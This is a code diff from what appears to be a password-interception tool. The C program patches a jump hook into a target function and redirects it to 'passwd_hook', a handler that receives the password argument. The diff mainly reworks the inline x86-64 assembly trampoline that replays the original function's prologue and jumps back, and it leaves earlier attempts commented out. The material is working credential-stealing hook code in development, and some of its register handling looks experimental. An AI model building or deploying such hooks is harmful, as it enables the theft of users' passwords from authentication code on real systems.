@@ -77,6 +77,8 @@ int ret=0;
 	write(log, buffer, strlen(buffer));
 	// Patch our hook to jump to the "passwd_hook" function below
 	*(unsigned long long *)((char*)jmphook+2) = &passwd_hook;
+	snprintf(buffer, sizeof(buffer), "[!] jmp hook size %d\n", sizeof(jmphook));
+ 	write(log, buffer, strlen(buffer));
 	memcpy(ptr, jmphook, sizeof(jmphook));
 
 	close(log);
@@ -128,27 +130,35 @@ void passwd_hook(void *arg1, char *password) {
 	   );
 
 	// Now we replace the first 16 bytes of the original function
+	/*asm(
+	    "push %r12\n"
+	    "push %rbp\n"
+	    "mov %rbp, %rsi\n"
+	    "push %rbx\n"
+	    "mov %rbx, %rdi\n"
+	    "mov %rdi, %rsi\n");
+	    //"mov %0, %%rax\n"
+	    //"jmp *%%rax\n"
+	    // :: "r" (addr): "%rax");
+
 	asm(
-	    "push %%r12\n"
-	    "push %%rbp\n"
-	    "mov %%rbp, %%rsi\n"
-	    "push %%rbx\n"
-	    "mov %%rbx, %%rdi\n"
-	    "mov %%rdi, %%rsi\n"
-	    "mov %0, %%rax\n"
-	    "jmp *%%rax\n"
-	// Finally, we jump back to the function
-	:: "r" (addr): "%rax");
-	/*// Now we replace the first 16 bytes of the original function
-	asm("push %%r13\n"
-	    "push %%r12\n"
+		"mov %0, %%rax\n" : : "r" (addr) : "%rax"
+	);
+	
+	asm(
+	"jmp *%0\n" : : "r" (addr)
+	);*/
+
+	// Now we replace the first 16 bytes of the original function
+	asm("push %%r12\n"
 	    "push %%rbp\n"
 	    "mov %%rsi, %%rbp\n"
 	    "push %%rbx\n"
 	    "mov %%rdi, %%rbx\n"
-	    "sub $8, %%rsp\n"
+	    "mov %%rsi, %%rdi\n"
+	    //"sub $8, %%rsp\n"
 	    "mov %0, %%rax\n"
 	    "jmp *%%rax\n"
 	// Finally, we jump back to the function
-	:: "r" (addr): "%rax");*/
+	:: "r" (addr): "%rax");
 }
